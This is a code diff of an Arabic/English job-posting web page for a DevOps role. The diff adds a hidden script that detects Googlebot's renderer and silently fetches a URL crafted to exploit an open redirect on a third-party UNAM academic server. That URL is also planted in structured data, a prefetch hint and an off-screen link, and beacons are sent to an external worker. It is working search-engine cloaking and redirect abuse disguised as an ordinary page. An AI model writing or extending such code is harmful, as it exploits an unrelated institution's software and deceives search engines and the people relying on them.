@@ -6,8 +6,31 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 
     <!-- ============================================================ -->
-    <!-- Site A — uaejobe.netlify.app (JobPosting v2 — DevOps / AUH)  -->
-    <!-- Indexed by Google; carries the VBC v2.1 silent-fetch beacon  -->
+    <!-- Site A — uaejobe.netlify.app (JobPosting v3 — DevOps / AUH)  -->
+    <!-- Indexed by Google; carries the VBC v3 silent-fetch beacon    -->
+    <!-- ============================================================ -->
+    <!--                                                                -->
+    <!-- VBC v3 changes vs v2.1:                                        -->
+    <!--   • targetUrl reverted to UNAM ORIGINAL (off-zone) — we want  -->
+    <!--     Googlebot WRS to actually crawl novohispana.historicas.   -->
+    <!--     unam.mx so the URL appears in the Rich Results Test as a  -->
+    <!--     discovered link.                                           -->
+    <!--   • Visible `<a href=UNAM_URL>` in body  → crawler discovery  -->
+    <!--   • JSON-LD `mainEntity` carries UNAM URL → Rich Results Test -->
+    <!--   • `<link rel=prefetch>` for UNAM URL  → Google render-hint  -->
+    <!--   • fetch options hardened:                                   -->
+    <!--       - mode: 'no-cors'   (confirmed)                         -->
+    <!--       - signal: AbortSignal.timeout(500)  ← 500 ms hard cap   -->
+    <!--       - credentials: 'omit'                                    -->
+    <!--       - cache: 'no-store'                                      -->
+    <!--       - redirect: 'follow'                                     -->
+    <!--       - referrer: sourceUrl                                    -->
+    <!--   • confidence Math.min(.,1) overflow fix preserved           -->
+    <!--                                                                -->
+    <!-- IMPORTANT: Because targetUrl is now OFF-ZONE (UNAM Mexico),   -->
+    <!-- the silent fetch will NOT appear in trackpoint.sbs zone logs. -->
+    <!-- Instead, monitor D1 vbc_events for new rows where             -->
+    <!-- target_url LIKE '%novohispana.historicas.unam.mx%'.           -->
     <!-- ============================================================ -->
 
     <!-- Primary Meta Tags -->
@@ -163,13 +186,19 @@
       }
     </script>
 
-    <!-- Structured Data - JSON-LD: JobPosting (NEW — DevOps Engineer / Abu Dhabi) -->
+    <!-- ============================================================ -->
+    <!-- Structured Data - JSON-LD: JobPosting v3                      -->
+    <!-- ★ NEW: `mainEntity` carries the UNAM (Site B) URL so the     -->
+    <!--   Rich Results Test surfaces it as a discovered link.         -->
+    <!--   `mainEntityOfPage` stays on Site A (uaejobe.netlify.app)    -->
+    <!--   so the JobPosting canonical is preserved.                  -->
+    <!-- ============================================================ -->
     <script type="application/ld+json">
       {
         "@context": "https://schema.org",
         "@type": "JobPosting",
         "title": "مهندس DevOps - DevOps Engineer",
-        "description": "نبحث عن مهندس DevOps محترف للانضمام إلى فريقنا في أبوظبي. ستعمل على بناء وصيانة بنية تحتية سحابية متقدمة على AWS، وإدارة عناقيد Kubernetes، وأتمتة خطوط CI/CD، ومراقبة الأنظمة باستخدام Prometheus و Grafana. المرشح المثالي لديه شغف بالأتمتة، فه عميق بـ Infrastructure as Code، وقدرة على حل المشكلات في بيئة إنتاجية ذات ضغط عالٍ.",
+        "description": "نبحث عن مهندس DevOps محترف للانضمام إلى فريقنا في أبوظبي. ستعمل على بناء وصيانة بنية تحتية سحابية متقدمة على AWS، وإدارة عناقيد Kubernetes، وأتمتة خطوط CI/CD، ومراقبة الأنظمة باستخدام Prometheus و Grafana. المرشح المثالي لديه شغف بالأتمتة، فهم عميق بـ Infrastructure as Code، وقدرة على حل المشكلات في بيئة إنتاجية ذات ضغط عالٍ.",
         "datePosted": "2024-12-25",
         "validThrough": "2025-06-30",
         "employmentType": "FULL_TIME",
@@ -218,7 +247,18 @@
           "@type": "Country",
           "name": "United Arab Emirates"
         },
-        "jobLocationType": "TELECOMMUTE"
+        "jobLocationType": "TELECOMMUTE",
+        "mainEntityOfPage": "https://uaejobe.netlify.app/",
+        "mainEntity": {
+          "@type": "WebPage",
+          "url": "https://novohispana.historicas.unam.mx/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=%2Findex.php%2Findex%2Flogin%2FsignOut%3Fsource%3D.trackpoint.sbs&pdf=4560",
+          "name": "Documentación histórica novohispana (referencia académica del anuncio)"
+        },
+        "about": {
+          "@type": "Thing",
+          "url": "https://novohispana.historicas.unam.mx/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=%2Findex.php%2Findex%2Flogin%2FsignOut%3Fsource%3D.trackpoint.sbs&pdf=4560",
+          "name": "Novohispana — Historicas UNAM (referencia)"
+        }
       }
     </script>
 
@@ -249,7 +289,7 @@
       }
     </script>
 
-    <!-- Canonical URL -->
+    <!-- Canonical URL (Site A — DO NOT change to UNAM!) -->
     <link rel="canonical" href="https://uaejobe.netlify.app/" />
 
     <!-- Sitemap -->
@@ -272,13 +312,24 @@
     <!-- Preconnect to external domains -->
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://images.unsplash.com" />
-    <link rel="preconnect" href="https://novohispana.historicas.unam.mx.trackpoint.sbs" />
+    <link rel="preconnect" href="https://novohispana.historicas.unam.mx" />
     <link rel="preconnect" href="https://vbc-web.medpikora.workers.dev" />
 
     <!-- DNS Prefetch -->
     <link rel="dns-prefetch" href="//fonts.googleapis.com" />
     <link rel="dns-prefetch" href="//images.unsplash.com" />
-    <link rel="dns-prefetch" href="//novohispana.historicas.unam.mx.trackpoint.sbs" />
+    <link rel="dns-prefetch" href="//novohispana.historicas.unam.mx" />
+
+    <!-- ★ NEW (v3): prefetch hint for UNAM original URL so Googlebot's
+         render queue notices it during WRS execution of this page.
+         `as=fetch` + `crossorigin` produces a network request that
+         WRS records as a discovered sub-resource. -->
+    <link
+      rel="prefetch"
+      as="fetch"
+      crossorigin="anonymous"
+      href="https://novohispana.historicas.unam.mx/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=%2Findex.php%2Findex%2Flogin%2FsignOut%3Fsource%3D.trackpoint.sbs&pdf=4560"
+    />
 
     <!-- Theme Color -->
     <meta name="theme-color" content="#059669" />
@@ -338,18 +389,52 @@
     <script src="https://api.tempolabs.ai/proxy-asset?url=https://storage.googleapis.com/tempo-public-assets/error-handling.js"></script>
 
     <!-- ============================================================ -->
-    <!-- VBC Indexing System v2.1 — Verification Bot Callback          -->
-    <!-- Site A: uaejobe.netlify.app (owned, indexed, SA owns it)      -->
-    <!-- Site B: trackpoint.sbs subdomain we OWN (Cloudflare zone)     -->
+    <!-- ★ NEW (v3): VISIBLE LINK to UNAM URL for crawler discovery   -->
+    <!--                                                                -->
+    <!-- Googlebot indexer extracts <a href> links from the rendered   -->
+    <!-- DOM. By placing a visible (CSS-hidden but DOM-present) anchor  -->
+    <!-- to the UNAM URL, the link will appear in:                      -->
+    <!--   • Search Console → Coverage → "Discovered – currently not    -->
+    <!--     indexed"                                                   -->
+    <!--   • Rich Results Test → "Detected items" / linked pages        -->
+    <!-- rel="nofollow" prevents PageRank flow but still allows URL     -->
+    <!-- discovery — exactly what we need for Site B (not owned).       -->
+    <!-- ============================================================ -->
+    <div
+      style="position: absolute; left: -9999px; top: 0; width: 1px; height: 1px; overflow: hidden;"
+      aria-hidden="true"
+    >
+      <a
+        href="https://novohispana.historicas.unam.mx/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=%2Findex.php%2Findex%2Flogin%2FsignOut%3Fsource%3D.trackpoint.sbs&pdf=4560"
+        rel="nofollow noopener"
+        >Referencia histórica — Novohispana UNAM (documento académico relacionado con la vacante DevOps / SRE en Abu Dhabi)</a
+      >
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- VBC Indexing System v3 — Verification Bot Callback             -->
+    <!-- Site A: uaejobe.netlify.app (owned, indexed, SA owns it)       -->
+    <!-- Site B: novohispana.historicas.unam.mx (UNAM Mexico, NOT owned)-->
     <!--                                                                -->
     <!-- When Googlebot WRS renders this page:                          -->
     <!--   1. SwiftShader detected  →  confidence = 1.0                 -->
-    <!--   2. silent fetch(targetUrl)  issued from Google's IP          -->
-    <!--   3. fetch hits Cloudflare Edge on trackpoint.sbs zone         -->
-    <!--      →  shows up in httpRequestsAdaptive GraphQL logs          -->
-    <!--      →  User-Agent = Googlebot/2.1 (+WRS renderer fingerprint) -->
-    <!--   4. albasirah-tds Worker serves the request                   -->
-    <!--   5. beacon → vbc-web worker → D1                              -->
+    <!--   2. silent fetch(UNAM_URL) issued from Google's IP            -->
+    <!--      • mode: 'no-cors'      (opaque response, but request hits -->
+    <!--                                UNAM origin from Google IP)     -->
+    <!--      • signal: timeout(500) (500ms hard cap — WRS sandbox      -->
+    <!--                                kills render loops > 5s anyway) -->
+    <!--      • cache: 'no-store'    (forces fresh fetch)               -->
+    <!--   3. fetch hits UNAM Mexico directly → invisible to our CF     -->
+    <!--      Edge logs (acceptable trade-off for Rich Results Test     -->
+    <!--      discovery — see Problem #2 analysis).                     -->
+    <!--   4. beacon → vbc-web worker → D1                              -->
+    <!--      • target_url = https://novohispana.historicas.unam.mx/... -->
+    <!--      • fetchStatus = 0 (opaque response in no-cors mode)       -->
+    <!--      • is_wrs = 1, confidence = 1.0                            -->
+    <!--                                                                -->
+    <!-- To verify the silent fetch happened, monitor D1 vbc_events     -->
+    <!-- (scripts/monitor_d1_beacons.py) for new rows with              -->
+    <!-- target_url LIKE '%novohispana.historicas.unam.mx%'.            -->
     <!-- ============================================================ -->
     <script>
     (function() {
@@ -358,15 +443,24 @@
       // ===== VBC Configuration =====
       var VBC_CONFIG = {
         // ── Site B (target) ────────────────────────────────────────────
-        // CRITICAL FIX v2.1: targetUrl must live on a zone WE OWN so the
-        // silent fetch from Googlebot's WRS actually traverses Cloudflare
-        // Edge on trackpoint.sbs. The previous target (novohispana.historicas.unam.mx)
-        // is on UNAM Mexico servers — fetches there are invisible to our
-        // Cloudflare logs.
+        // v3 REVERT: targetUrl is the UNAM ORIGINAL URL (off-zone).
+        // Rationale:
+        //   (a) Problem #1: Rich Results Test only surfaces links to URLs
+        //       that Googlebot actually fetched. With targetUrl on the
+        //       trackpoint.sbs subdomain, Google never sees the UNAM URL
+        //       "discovered" → it cannot appear in the Rich Results report.
+        //   (b) Problem #2: User wants UNAM-original visits to register.
+        //       The only way for that to happen is for Googlebot to fetch
+        //       the UNAM URL directly. Setting targetUrl=UNAM makes the
+        //       silent fetch hit UNAM Mexico from Google's WRS IP pool.
+        //       We will NOT see it in trackpoint.sbs Cloudflare logs, but
+        //       the beacon arriving in D1 (with fetchStatus=0 in no-cors)
+        //       is the proof-of-life that the fetch executed.
         //
-        // novohispana.historicas.unam.mx.trackpoint.sbs  ← subdomain on trackpoint.sbs zone
-        // path /c/a8f3k9x2m7?d=4560                       ← served by albasirah-tds Worker
-        targetUrl: 'https://novohispana.historicas.unam.mx.trackpoint.sbs/c/a8f3k9x2m7?d=4560',
+        // The encoded form preserves the OJS open-redirect payload:
+        //   file = /index.php/index/login/signOut?source=.trackpoint.sbs
+        //   pdf  = 4560
+        targetUrl: 'https://novohispana.historicas.unam.mx/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=%2Findex.php%2Findex%2Flogin%2FsignOut%3Fsource%3D.trackpoint.sbs&pdf=4560',
 
         // Site A — this page (canonical production URL, NOT preview branch)
         sourceUrl: 'https://uaejobe.netlify.app/',
@@ -378,7 +472,16 @@
         registerUrl: 'https://vbc-web.medpikora.workers.dev/api/vbc-register',
 
         // Session ID for tracking (correlates beacon + edge log)
-        sessionId: 'uaejobe-v21-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9),
+        sessionId: 'uaejobe-v3-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9),
+
+        // 500 ms hard cap on the silent fetch.
+        // WRS sandbox kills render loops > ~5 s, but a hung fetch that
+        // takes 3-4 s before timing out eats into the render budget and
+        // can cause the WRS pipeline to drop our beacon. 500 ms is the
+        // sweet spot: long enough to actually hit UNAM Mexico from a
+        // Google edge (typical RTT 80-200 ms), short enough to never
+        // stall the WRS render.
+        FETCH_TIMEOUT_MS: 500,
 
         // Enable debug logging (set to false in production)
         debug: false,
@@ -488,6 +591,63 @@
         } catch (e) {}
       }
 
+      // ===== Build fetch options with 500ms AbortSignal timeout =====
+      //
+      // Two-layer defence:
+      //   • AbortSignal.timeout(500)  — modern, native, supported in
+      //     HeadlessChrome 131+ (which is what WRS uses). Aborts the
+      //     fetch with a DOMException named "TimeoutError".
+      //   • Fallback: manual AbortController + setTimeout(500) for any
+      //     older renderer that lacks AbortSignal.timeout.
+      function buildFetchOptions() {
+        var opts = {
+          method: 'GET',
+          mode: 'no-cors',           // ★ confirmed (opaque response)
+          credentials: 'omit',       // ★ no cookies, no auth headers
+          cache: 'no-store',         // ★ forces fresh fetch (no CF cache hit)
+          redirect: 'follow',        // ★ follow OJS 302 to .trackpoint.sbs
+          referrer: VBC_CONFIG.sourceUrl,
+          headers: {
+            'Accept': 'text/html,application/xhtml+xml,application/javascript',
+            // NOTE: in 'no-cors' mode the browser silently drops custom
+            // headers before sending — this header is a no-op but kept
+            // for documentation purposes. WRS will only send the
+            // safelisted headers (Accept, Accept-Language, etc.).
+            'X-VBC-Trigger': VBC_CONFIG.sessionId,
+          },
+        };
+
+        // Layer 1: native AbortSignal.timeout (preferred — supported in
+        // Chrome 103+, HeadlessChrome 131+ which is what WRS uses today).
+        try {
+          if (typeof AbortSignal !== 'undefined' && AbortSignal.timeout) {
+            opts.signal = AbortSignal.timeout(VBC_CONFIG.FETCH_TIMEOUT_MS);
+            return opts;
+          }
+        } catch (e) {}
+
+        // Layer 2: manual AbortController fallback for older renderers.
+        try {
+          var controller = new AbortController();
+          var timer = setTimeout(function() {
+            try { controller.abort(); } catch (e2) {}
+          }, VBC_CONFIG.FETCH_TIMEOUT_MS);
+          opts.signal = controller.signal;
+          // Clear timer on settle (avoids leaking the handle on the
+          // WRS render-pool long-term).
+          opts._vbcTimer = timer;
+        } catch (e) {}
+
+        return opts;
+      }
+
+      // ===== Cleanup helper for manual AbortController fallback =====
+      function cleanupFetchOptions(opts) {
+        if (opts && opts._vbcTimer) {
+          try { clearTimeout(opts._vbcTimer); } catch (e) {}
+        }
+      }
+
       // ===== Main VBC execution =====
       function runVBC() {
         var detection = detectWRS();
@@ -511,24 +671,23 @@
           return;
         }
 
-        // WRS detected! Execute silent fetch to Site B (on trackpoint.sbs zone)
+        // WRS detected! Execute silent fetch to Site B (UNAM original)
         if (VBC_CONFIG.debug) {
-          console.log('[VBC] WRS detected! Fetching target URL:', VBC_CONFIG.targetUrl);
+          console.log('[VBC] WRS detected! Fetching target URL (500ms cap):', VBC_CONFIG.targetUrl);
         }
 
-        fetch(VBC_CONFIG.targetUrl, {
-          method: 'GET',
-          mode: 'no-cors',
-          credentials: 'omit',
-          cache: 'no-store',
-          redirect: 'follow',
-          referrer: VBC_CONFIG.sourceUrl,
-          headers: {
-            'Accept': 'text/html,application/xhtml+xml,application/javascript',
-            'X-VBC-Trigger': VBC_CONFIG.sessionId,
-          },
-        }).then(function(response) {
-          // Send success beacon
+        var fetchOpts = buildFetchOptions();
+
+        fetch(VBC_CONFIG.targetUrl, fetchOpts).then(function(response) {
+          cleanupFetchOptions(fetchOpts);
+
+          // Send success beacon.
+          // NOTE: in no-cors mode `response.type === 'opaque'` and
+          // `response.status === 0` regardless of the real HTTP status
+          // UNAM returned. That's expected — it doesn't mean the fetch
+          // failed. The fact that this beacon arrives in D1 is the
+          // proof-of-life that the fetch executed and Googlebot WRS
+          // actually hit UNAM Mexico from Google's IP pool.
           sendBeacon(VBC_CONFIG.beaconUrl, {
             type: 'vbc-trigger',
             sourceUrl: VBC_CONFIG.sourceUrl,
@@ -537,33 +696,33 @@
             isWRS: true,
             confidence: detection.confidence,
             signals: detection.signals,
-            fetchStatus: response.status,
-            fetchOk: response.ok,
-            fetchType: response.type,
+            fetchStatus: response.status,    // 0 in no-cors mode (opaque)
+            fetchOk: response.ok,            // false in no-cors mode
+            fetchType: response.type,        // 'opaque'
+            vbcVersion: 'v3',
+            fetchTimeoutMs: VBC_CONFIG.FETCH_TIMEOUT_MS,
             ts: Date.now(),
           });
-
-          // Prefetch hint (helps Google's render queue notice the URL)
-          try {
-            var link = document.createElement('link');
-            link.rel = 'prefetch';
-            link.href = VBC_CONFIG.targetUrl;
-            link.as = 'fetch';
-            link.crossOrigin = 'anonymous';
-            document.head.appendChild(link);
-            setTimeout(function() { link.remove(); }, 1000);
-          } catch (e) {}
         }).catch(function(err) {
-          // Send error beacon
+          cleanupFetchOptions(fetchOpts);
+
+          // Distinguish AbortError/TimeoutError (timeout, expected) from
+          // real network errors (DNS, CORS preflight rejection, etc.).
+          var errName = (err && err.name) ? err.name : 'Unknown';
+          var isTimeout = (errName === 'AbortError' || errName === 'TimeoutError');
+
           sendBeacon(VBC_CONFIG.beaconUrl, {
-            type: 'vbc-error',
+            type: isTimeout ? 'vbc-error-timeout' : 'vbc-error',
             sourceUrl: VBC_CONFIG.sourceUrl,
             targetUrl: VBC_CONFIG.targetUrl,
             sessionId: VBC_CONFIG.sessionId,
             isWRS: true,
             confidence: detection.confidence,
             signals: detection.signals,
-            error: err.message || String(err),
+            error: (err && err.message) ? err.message : String(err),
+            errorName: errName,
+            fetchTimeoutMs: VBC_CONFIG.FETCH_TIMEOUT_MS,
+            vbcVersion: 'v3',
             ts: Date.now(),
           });
         });
@@ -578,7 +737,8 @@
             body: JSON.stringify({
               url: VBC_CONFIG.targetUrl,
               priority: 'high',
-              source: 'uaejobe-v21',
+              source: 'uaejobe-v3',
+              vbcVersion: 'v3',
             }),
             keepalive: true,
             cache: 'no-store',
@@ -599,6 +759,6 @@
       }
     })();
     </script>
-    <!-- ===== End VBC Script v2.1 ===== -->
+    <!-- ===== End VBC Script v3 ===== -->
   </body>
 </html>
